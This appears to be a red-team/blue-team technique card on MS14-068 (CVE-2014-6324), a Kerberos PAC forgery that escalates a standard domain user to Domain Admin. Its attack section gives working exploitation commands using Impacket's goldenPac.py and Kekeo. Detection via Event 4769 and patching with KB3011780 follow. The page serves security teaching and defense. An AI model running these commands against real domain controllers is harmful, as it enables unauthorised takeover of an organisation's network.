# [CA-KERB-007]: MS14-068 Checksum Bypass

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-007 |
| **MITRE ATT&CK v18.1** | [Steal or Forge Kerberos Tickets (T1558)](https://attack.mitre.org/techniques/T1558/) |
| **Tactic** | Credential Access / Privilege Escalation |
| **Platforms** | Windows AD |
| **Severity** | **Critical** |
| **CVE** | **CVE-2014-6324** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Exploitation of a vulnerability in the Kerberos Key Distribution Center (KDC) checksum validation. Attackers can forge a Privilege Attribute Certificate (PAC) with Domain Admin privileges and inject it into a valid TGT. The KDC fails to validate the signature properly, accepting the forged privileges.
- **Attack Surface:** Unpatched Domain Controllers (pre-2014).
- **Business Impact:** **Total Domain Compromise** from a standard user account.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Any Valid Domain User + Credentials.
- **Vulnerable Config:** Domain Controllers missing KB3011780.
- **Tools:**
    - [ms14-068.py (GoldenPac)](https://github.com/fortra/impacket)
    - [Kekeo](https://github.com/gentilkiwi/kekeo)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Exploitation**
Request a TGT with forged PAC.
```bash
# Impacket goldenPac automatically exploits and psexecs
goldenPac.py target.local/user:password@DC01.target.local
```

**Step 2: Windows (Kekeo)**
```cmd
kekeo # kerberos::tgt /user:user /password:pass /domain:target.local
# Exploit: kerberos::pac /subject:Administrator /logon:user /ticket:TGT.kirbi
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security** | 4769 | Failure Code: `0xF` (KDC_ERR_SUMTYPE_NOSUPP) - rare in healthy AD. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Patching:** Ensure all Domain Controllers have **KB3011780** (released Nov 2014) installed. This vulnerability is ancient but still found in legacy environments.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-VALID-001]
> **Next Logical Step:** [LAT-AD-003]
